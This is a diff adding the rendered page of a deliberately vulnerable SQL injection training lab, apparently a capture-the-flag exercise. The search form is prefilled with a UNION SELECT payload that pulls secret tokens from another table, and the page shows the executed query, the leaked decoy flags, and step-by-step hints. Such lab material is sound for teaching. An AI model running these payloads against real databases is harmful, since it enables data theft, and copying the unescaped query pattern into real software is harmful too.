@@ -1,0 +1,154 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>SQLi Lab</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/static/css/main.css">
+  </head>
+  <body>
+    <nav class="navbar navbar-expand-lg border-bottom mb-4">
+      <div class="container-fluid">
+        <a class="navbar-brand fw-bold d-flex align-items-center gap-2" href="/">
+          <img src="/static/img/potato.svg" alt="Potato" class="logo-potato">
+          #4CK P07470
+        </a>
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#nav">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div id="nav" class="collapse navbar-collapse">
+          <ul class="navbar-nav ms-auto">
+            
+              <li class="nav-item"><a class="nav-link" href="/dashboard">Dashboard</a></li>
+              <li class="nav-item"><a class="nav-link" href="/sqli">SQLi Basic</a></li>
+              <li class="nav-item"><a class="nav-link" href="/sqli/contracts">SQLi Advanced</a></li>
+              <li class="nav-item"><a class="nav-link" href="/sqli/blind">SQLi Blind</a></li>
+              <li class="nav-item"><a class="nav-link" href="/xss">XSS Lab</a></li>
+              <li class="nav-item"><a class="nav-link" href="/csrf">CSRF Lab</a></li>
+              <li class="nav-item"><a class="nav-link" href="/bonus">Bonus</a></li>
+              <li class="nav-item"><a class="nav-link" href="/flags">Submit Flags</a></li>
+              <li class="nav-item"><a class="nav-link text-danger" href="/logout">Logout</a></li>
+            
+            
+              <li class="nav-item"><a class="nav-link" href="/admin/login">Admin</a></li>
+            
+          </ul>
+        </div>
+      </div>
+    </nav>
+
+    <main class="container pb-5">
+      
+        
+      
+
+      
+<div class="row gy-4">
+  <div class="col-lg-7">
+    <div class="card border-0 shadow-sm">
+      <div class="card-body">
+        <h1 class="h4 fw-semibold mb-3">SQL Injection Playground</h1>
+        <p class="text-muted small">Search the leaderboard by player name. The backend concatenates your input directly into the SQL statement — no escaping!</p>
+        <form method="GET">
+          <label class="form-label">Name contains</label>
+          <div class="input-group">
+            <input class="form-control" name="term" value="&#39; AND 0 UNION SELECT secret_token, &#39;flag&#39;, 99999 FROM player_secrets --" placeholder="%">
+            <button class="btn btn-primary" type="submit">Query</button>
+          </div>
+        </form>
+        
+        <div class="mt-4">
+          <div class="fw-semibold small text-uppercase text-muted">Executed Query</div>
+          <pre class="bg-dark text-warning p-3 rounded small">SELECT roll_no, display_name, points FROM leaderboard WHERE display_name LIKE &#39;%&#39; AND 0 UNION SELECT secret_token, &#39;flag&#39;, 99999 FROM player_secrets --%&#39; ORDER BY points DESC</pre>
+        </div>
+        
+        
+        
+        <table class="table mt-4">
+          <thead>
+            <tr>
+              <th>Roll</th>
+              <th>Name</th>
+              <th>Points</th>
+            </tr>
+          </thead>
+          <tbody>
+            
+            <tr>
+              <td>FLAG{Trust_me_its_ture_2}</td>
+              <td>flag</td>
+              <td>99999</td>
+            </tr>
+            
+            <tr>
+              <td>FLAG{This_is_not_the_flag}</td>
+              <td>flag</td>
+              <td>99999</td>
+            </tr>
+            
+            <tr>
+              <td>FLAG{I_am_scared_of_injection}</td>
+              <td>flag</td>
+              <td>99999</td>
+            </tr>
+            
+            <tr>
+              <td>FLAG{Trust_me_its_false_1}</td>
+              <td>flag</td>
+              <td>99999</td>
+            </tr>
+            
+            <tr>
+              <td>FLAG{Trust_me_its_false_2}</td>
+              <td>flag</td>
+              <td>99999</td>
+            </tr>
+            
+            <tr>
+              <td>FLAG{Trust_me_its_ture_1}</td>
+              <td>flag</td>
+              <td>99999</td>
+            </tr>
+            
+          </tbody>
+        </table>
+        
+      </div>
+    </div>
+  </div>
+  <div class="col-lg-5">
+    <div class="card border-0 shadow-sm h-100">
+      <div class="card-body">
+        <h2 class="h5 fw-semibold">Objective</h2>
+        <p>Extract the hidden flag by exploiting the vulnerable leaderboard query.</p>
+        <ul class="small">
+          <li>The query uses <code>LIKE '%{your_input}%'</code> - think about how to break out of this.</li>
+          <li>Use <code>UNION SELECT</code> to combine results from another table.</li>
+          <li>Submit the extracted flag via the flag station.</li>
+        </ul>
+        <div class="alert alert-info small mt-3">
+          <strong>💡 Hints:</strong>
+          <ul class="mb-0 mt-2">
+            <li>Start with <code>%'</code> to close the LIKE pattern and break the SQL string.</li>
+            <li>The original query selects 3 columns - your UNION must match this count.</li>
+            <li>Try: <code>%' UNION SELECT 1,2,3--</code> first to test column count.</li>
+            <li>Look for a table containing player secrets or rewards.</li>
+            <li>The flag column might be named something like <code>secret_token</code> or <code>token</code>.</li>
+            <li>You'll see multiple results - try submitting each one to find the correct flag.</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    </main>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+    
+  </body>
+</html>
